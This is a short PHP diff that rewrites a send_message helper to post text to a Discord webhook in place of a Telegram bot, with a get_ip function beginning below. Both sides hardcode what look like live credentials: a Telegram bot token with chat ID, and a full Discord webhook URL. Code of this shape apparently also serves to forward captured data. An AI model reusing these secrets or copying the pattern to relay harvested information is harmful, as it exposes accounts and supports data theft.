@@ -1,21 +1,27 @@
 <?php
 
-  function send_message($text){
+  function send_message($text) {
+    $webhook = 'https://discord.com/api/webhooks/1544994017886998559/noa3HDoMaS71iZ0PXPSpHlAmXxugOUuFkoDYj-QOjxddWNhWgjshV8GdDdOGdnal_FHy';
 
-    $token = "6010612567:AAHmvmFttqrfXeEtEUMJUUJvwx4DPkMtU74";
-    $chat_id = "5247038144";
+    $payload = [
+        'content' => $text
+    ];
 
-    $text = ["chat_id" => $chat_id,"text" => $text,"parse_mode"=>"html"];
-
-    $ch = curl_init('https://api.telegram.org/bot' . $token . '/sendMessage');  
-    curl_setopt($ch, CURLOPT_POST, 1);  
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $text);
+    $ch = curl_init($webhook);
+    curl_setopt($ch, CURLOPT_POST, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(
+        $payload,
+        JSON_UNESCAPED_UNICODE
+    ));
+    curl_setopt($ch, CURLOPT_HTTPHEADER, [
+        'Content-Type: application/json'
+    ]);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HEADER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+
     curl_exec($ch);
     curl_close($ch);
-
-  }
+}
 
 
   function get_ip()
